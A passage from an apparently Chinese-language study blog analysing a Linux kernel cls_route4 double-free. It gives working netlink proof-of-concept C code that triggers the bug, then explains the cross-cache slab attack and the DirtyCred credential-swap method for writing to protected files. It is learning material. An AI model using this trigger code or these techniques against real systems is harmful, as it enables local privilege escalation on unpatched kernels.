class="comment">/* ifi_change */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> tfilter[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWTFILTER */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="comment">/* OPTIONS */</span></span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_TO */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_FROM */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ntfilter[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWTFILTER */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="comment">/* 0x200 = NLM_F_EXCL */</span></span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* OPTIONS */</span></span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_TO */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_FROM */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> linkcmd[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWQDISC */</span></span><br><span class="line">        <span class="number">36</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x05</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">build_qfq</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *qopt;</span><br><span class="line">        <span class="keyword">short</span> *tlen;</span><br><span class="line">        <span class="keyword">char</span> *qdisc = <span class="string">&quot;qfq&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">short</span> *optlen;</span><br><span class="line">        <span class="keyword">short</span> *opttype;</span><br><span class="line"></span><br><span class="line">        tlen = buf;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, linkcmd, <span class="keyword">sizeof</span>(linkcmd));</span><br><span class="line">        <span class="built_in">strcpy</span>(buf+<span class="keyword">sizeof</span>(linkcmd), qdisc);</span><br><span class="line">        *tlen = <span class="keyword">sizeof</span>(linkcmd) + <span class="built_in">strlen</span>(qdisc) + <span class="number">1</span>;</span><br><span class="line">        buf[<span class="number">36</span>] = <span class="built_in">strlen</span>(qdisc)+<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        qopt = buf + *tlen;</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="comment">/* 24, 0x00, 0x02, 0x00, */</span></span><br><span class="line">        optlen = qopt;</span><br><span class="line">        opttype = optlen + <span class="number">1</span>;</span><br><span class="line">        *opttype = <span class="number">0x2</span>;</span><br><span class="line"></span><br><span class="line">        *optlen = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        *tlen += *optlen;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> *tlen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">pid_t</span> p;</span><br><span class="line">        <span class="keyword">int</span> *error;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">4096</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> tlen;</span><br><span class="line">        <span class="keyword">char</span> buf2[<span class="number">4096</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        error = (<span class="keyword">int</span> *) (buf + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWUSER|CLONE_NEWNET);</span><br><span class="line">        tlen = build_qfq(buf);</span><br><span class="line">        s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);</span><br><span class="line">        perror(<span class="string">&quot;socket:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s: %d\n&quot;</span>,s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;newlink:\n&quot;</span>);</span><br><span class="line">        hexdump(newlink,<span class="number">0x100</span>);</span><br><span class="line">        write(s, newlink, <span class="keyword">sizeof</span>(newlink));</span><br><span class="line">        read(s, buf2, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        perror(<span class="string">&quot;NLMSG_ERROR&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;msg type:%d\n&quot;</span>,*(<span class="keyword">short</span> *)(buf + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;qdisc:\n&quot;</span>);</span><br><span class="line">        hexdump(buf,<span class="number">0x100</span>);</span><br><span class="line">        write(s, buf, tlen);</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tfilter:\n&quot;</span>);</span><br><span class="line">        hexdump(tfilter,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, tfilter, <span class="keyword">sizeof</span>(tfilter));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ntfilter:\n&quot;</span>);</span><br><span class="line">        hexdump(ntfilter,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, ntfilter, <span class="keyword">sizeof</span>(ntfilter));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dellink:\n&quot;</span>);</span><br><span class="line">        hexdump(dellink,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, dellink, <span class="keyword">sizeof</span>(dellink));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc写的比较清晰的，首先是<code>socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);</code>,然后发了五次包，第一第二次好似是设置网络设备的，比较重要的是第三第四和四五次发包，第三次发包是创建了一个<code>handle</code>为0的<code>route4_filter</code>，第四次发包还是传入一个<code>handle</code>为0的<code>route4_filer</code>，这样第一次创建的<code>route4_filer</code>就被释放当时没有脱链，然后第五次发包是删除第一次发包创建的<code>link</code>,这样就顺带着把他的<code>route4_filer</code>也给free掉了，这样就构成了一个<code>doublefree</code>了。而且不止doubelfree了<code>route4_filter</code>，还doublefree了一个指针数组，前一个的obj的size为<code>kmalloc-192</code>,后一个是<code>kmalloc-256</code></p>
<p>触发了doublefree但是内核并没有直接崩溃。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221201205500293.png" alt="image-20221201205500293"></p>
<h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><p>感觉挺有意思的，也学到了很多东西，漏洞利用主要分为两部分，分别是<code>cross cache attack</code>和<code>dirty cred</code>，下面分别就这两点详细展开学习。</p>
<h4 id="cross-cache-attack"><a href="#cross-cache-attack" class="headerlink" title="cross cache attack"></a>cross cache attack</h4><p>他的主要作用就是绕过内核的slab隔离。在没有看n1ctf那道内核题目之前还不是能完全理解这种攻击思路的强大，现在再来看的是发现简直好用的一。</p>
<p>内核是从<code>kmem_cahches</code>中申请不同大小的obj的，而<code>keme_caches</code>即<code>kmalloc slab allocation</code>则是基于<code>buddy allocator</code>的，<code>buddy allocator</code>就是伙伴系统，当kmalloc cache上没有足够的obj的时候，就会向buddy allocator申请<code>order-n page</code>,具体会调用 <code>new_slab()</code> -&gt; <code>allocate_slab()</code> -&gt; <code>alloc_slab_page()</code> 向 buddy allocator 申请页。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab allocation and freeing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">        struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);      <span class="comment">// order = kmem_cache-&gt;oo.x &gt;&gt; 16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">        folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!folio)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    slab = folio_slab(folio);</span><br><span class="line">    __folio_set_slab(folio);</span><br><span class="line">    <span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">        slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中order-n中的n到底是多少就看这个slab的类型了，可以通过<code>cat /proc/slabinfo</code>快速知道,我查看我自己ubuntu16的cred的slab,发现要要是用伙伴系统中的<code>order-2</code>，也就是一次向伙伴系统中直接申请两个连续的页面用于cred的slab。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo cat /proc/slabinfo | grep cred</span><br><span class="line">cred_jar            8316   8316    192   42    2 : tunables    0    0    0 : slabdata    198    198      0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>buddy allocator 为每个 order-n page 保存着一个 FIFO queue 数组，order-n page 表示 2^n个连续页的内存。当你释放chunk后导致slab全部空闲时，slab allocator 就会将页还给 buddy allocator。</li>
<li>slab对应的order由很多因素决定，如 slab chunk 大小、系统定义、内核编译等，最简单的方法是查看 <code>/proc/slabinfo</code>。</li>
<li>如果所申请的 order-n page 队列为空，则将 order-n+1 的页一分为二，一半返回给申请者，一半保存在 order-n 中；如果1个page返回给 buddy allocator，且其对应的 buddy page 也在同一队列中，则整合后放在下一order的page队列中。</li>
</ul>
<p>cross cache attack原理攻击的整体思路是，当一个slab 页面被全部释放的时候会被回收，这时被回收的页面是可以被其他种类的slab使用的这样就可以跨slab种类来进行利用，如Zhenpeng Lin 的ppt中演示的：</p>
<p><img src="https://img-blog.csdnimg.cn/a2523bab1dc14ef6815c3dffd48f9c30.png#pic_center" alt="在这里插入图片描述"></p>
<p>假定我们有一个非法释放漏洞(或double free)，但只能释放普通slab 中的堆块：</p>
<ul>
<li>1.首先喷射一堆该大小的普通堆块，这样会消耗一大堆slab 页面。我们的double free目标指针指向其中一个堆块，先将其释放</li>
<li>2.然后将喷射的一大堆普通堆块都释放掉，这样double free目标堆块所在slab 页面中的所有堆块(绝大概率)会被都释放掉，该slab 页面为空，会被系统回收</li>
<li>3.这时喷射一大堆filp / 其他slab 类型的堆块，这样目标指针所在页面大概率会被filp 类型slab或其他目标类型slab重新申请到吗，并且目标指针(double free漏洞指针)指向其中一个struct file结构体</li>
<li>4.使用漏洞的第二次释放能力，该struct file结构体被非法释放</li>
</ul>
<h4 id="dirty-cred"><a href="#dirty-cred" class="headerlink" title="dirty cred"></a>dirty cred</h4><h5 id="struct-file"><a href="#struct-file" class="headerlink" title="struct file"></a>struct file</h5><p>很有意思的一个攻击思路。主要的思路就是利用高凭证替换低凭证。而凭证一般就是<code>cred</code>和<code>file</code>,下面主要探讨在<code>doublefree</code>情况下如何进行凭证替换。</p>
<p>file结构体是打开一个文件时就会创建的一个结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags;</span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode; <span class="comment">//读写权限</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="keyword">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="keyword">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下面是介绍<code>dirty cred</code>的论文中提到的doublefree情况下的利用过程，但我觉得其实没必要这么麻烦的，如果只是高凭证替换低凭证的话，假如<code>ptr1</code>拥有doublefree,那先把ptr1给free一次，然后让低凭证申请到这个obj,就记作ptr2,然后再free一次ptr1,就把低凭证也给free掉了，接着再堆喷低凭证,再次申请到ptr2指向的内存，记作ptr3,这样ptr2和ptr3就指向了桶一块低凭证<code>struct file</code>了，然后通过系统调用<code>kcmp</code>来得知<code>ptr2</code>和<code>ptr3</code>指向同一个<code>struct file</code>(因为是堆喷)，然后释放低凭证的<code>struct file</code>就能替换成高凭证了。</p>
<p>哦我懂了，下面的方法其实更加通用，因为如果能<code>doublefree</code>的话可能obj的大小不等于<code>struct file</code>的大小，所以可能出现不对齐的现象，所以需要两个ptr指向同一个obj了。上述方法只适用于刚好对齐。</p>
<p><strong>方法</strong>：一般 Double-Free 发生在通用cache中，而内核凭证位于 dedicated cache 中，所以这里需要进行 cross-cache 内存布局。内核会回收未使用的内存页，然后分配给其他需要更多空间的cache。</p>
<ul>
<li><code>a-d</code>：两次触发DF，获得2个指向同一漏洞对象的悬垂指针（<code>ptr1&#39;</code> / <code>ptr2&#39;</code>）；</li>
<li><code>e</code>：将该通用cache的内存页全部释放归还给页管理器，这样该内存页就可以分配给 <code>dedicated cache</code> （存放凭证对象）；</li>
<li><code>f</code>：分配大量凭证对象（特殊cache）占据漏洞对象对应的空闲块，现在有3个指针指向该内存块了（2个悬垂指针和一个victim对象中的凭证指针，悬垂指针可能未对齐，指向凭证对象的内部）；</li>
<li><code>g</code>：利用其中1个悬垂指针（<code>ptr2&#39;</code>）释放凭证对象，创造空洞；</li>
<li><code>h</code>：分配新的低权限凭证对象占据该位置；</li>
<li>剩余1个悬垂指针（<code>ptr1&#39;</code>）指向低权限凭证对象，再次释放后就能用高权限凭证对象替换低权限凭证对象了。</li>
</ul>
<p><img src="https://pic4.zhimg.com/80/v2-69fe299aa60f25a13d7977bf3bbc8763_720w.webp" alt="img"></p>
<p>到目前为止已经能凭证替换了，现在就得利用凭证替换来完成对不可写文件的写入了，在老版本4.13以前使用<code>writev</code>向某个文件中写入内容时逻辑时这样的</p>
<ol>
<li>进行访问权限校验(是否可写)</li>
<li>从用户空间获取写入内容</li>
<li>实际写入操作</li>
</ol>
<p>可以看出在验证完权限和实际写入操作之间还有一步操作，这就可以形成条件竞争了，只要验证完可写权限之后就通过堵塞卡在第二步，然后替换成高凭证。再写入的时候就往不可写文件里写入内容了。</p>
<p>d按时这种办法已经是昨日黄花了，在4.13版本以后writev的逻辑就成这样了</p>
<ol>
<li>从用户空间获取写入内容</li>
<li>进行访问权限校验(是否可写)</li>
<li>实际写入操作</li>
</ol>
<p>所以在新版本就没办法利用老办法堵塞增大时间窗(从检查权限到真正操作之间的时间)了。但是增大时间窗还是有的，这就利用了文件的innode锁了。</p>
<p>在已经有一个进程对一个文件进行写入操作的时候，会给文件inode上锁，其他向该文件进行写入的进程需要等待上一个进程写入完成解锁。所以就可以有这样的利用了,这样同样可以增大时间窗。</p>
<ol>
